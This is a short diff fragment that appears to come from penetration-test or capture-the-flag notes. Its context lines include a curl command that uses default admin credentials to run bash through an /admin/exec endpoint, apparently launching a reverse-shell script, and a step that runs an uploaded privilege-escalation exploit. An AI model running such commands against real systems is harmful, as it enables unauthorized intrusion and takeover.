@@ -1763,4 +1763,4 @@ tcp   LISTEN    0      128             [::]:2222          [::]:*
 			- curl -u admin:adminadmin http://20.30.40.150:8080/admin/exec?cmd='bash%20-c%20/home/foothold/rev
 - Escalate privileges using the uploaded Copy-Fail exploit
 	- python3 /home/foothold/cf2.py
-	
+?? what is the context of the login ??
